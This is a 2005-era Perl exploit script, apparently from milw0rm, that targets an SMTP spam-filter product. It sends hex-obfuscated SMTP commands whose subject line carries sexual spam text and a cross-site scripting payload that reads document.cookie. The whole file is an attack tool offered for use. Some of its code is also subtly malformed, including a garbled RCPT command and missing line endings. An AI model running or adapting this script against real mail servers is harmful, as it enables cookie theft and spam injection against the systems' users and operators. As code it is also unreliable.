#!usr/bin/perl
#
#    FREE SMTP Spam Filter Exploit
# ------------------------------------
#  Infam0us Gr0up - Securiti Research
#
# Info: infamous.2hell.com
# Vendor URL: http://www.softstack.com/
# 

use IO::Socket;
use Socket;

print("\n   FREE SMTP Spam Filter Exploit\n");
print(" ---------------------------------\n\n");

# Changes to own feed 
$helo = "mail.test"; # HELO
$mfrom = "[support@vuln.test]"; # MAIL FROM
$rcpto = "[root@localhost]"; # RCPT TO
$date = "11 Feb 2099 12:07:10"; # Date
$from = "Micro SEX's"; # From mailer
$subject = "Check the new version.. ®®®\n".
"[b]VICKY VETTE[/b][i]is HOT Editon.Check it OUT!!. Free Nude Shop. Sex,video,picture,toys and XXX Chat Adults live!!![/i]".
"[br][a href=http://127.0.0.1 onMouseOver=alert(document.cookie);]Click Here[/a]"; # subject spammmer

if($#ARGV < 0 | $#ARGV > 1) { 
die "usage: perl $0 [IP/host] \nExam: perl $0 127.0.0.1 \n" };

$adr = $ARGV[0];
$prt = "25";

# Don't changes this one
$act1 = "\x48\x45\x4c\x4f $helo";
$act2 = "\x4d\x41\x49\x4c \x46\x52\x4f\x4d\x3a$mfrom";
$act3 = "\x52\x43\x50\x54 f\x54\x4f\x3a$rcpto";
$act4 = "\x44\x41\x54\x41";
$act5 = "\x44\x61\x74\x65\x3a $date";

$sub = 
"\x46\x72\x6f\x6d\x3a $from".
"\x53\x75\x62\x6a\x65\x63\x74\x3a $subject\x2e".
"\x51\x55\x49\x54";

print "[+] Connect to $adr..\n";
$remote = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$adr,
PeerPort=>$prt, Reuse=>1) or die "[-] Error: can't connect to $adr:$prt\n";
print "[+] Connected!\n";
$remote->autoflush(1);
print "[*] Send HELO..";
print $remote "$act1" or die "\n[-] Error: can't send xploit code\n";
sleep(1);
print "[OK]\n";
print "[*] Send MAIL FROM..";
print $remote "$act2" or die "\n[-] Error: can't send xploit code\n";
sleep(1);
print "[OK]\n";
print "[*] Send RCPT TO..";
print $remote "$act3" or die "\n[-] Error: can't send xploit code\n";
sleep(1);
print "[OK]\n";
print "[*] Send DATA..";
print $remote "$act4" or die "\n[-] Error: can't send xploit code\n";
sleep(1);
print "[OK]\n";
print "[*] Send DATE..";
print $remote "$act5" or die "\n[-] Error: can't send xploit code\n";
sleep(1);
print "[OK]\n";
print "[*] Send Sub Mail..";
print $remote "$sub" or die "\n[-] Error: can't send xploit code\n";
print "[OK]\n";
print "[*] QUIT..\n";
print "[+] MAIL SPAMWNED!\n\n";
close $remote;
print "press any key to exit..\n";
$bla= [STDIN];

# milw0rm.com [2005-09-02]
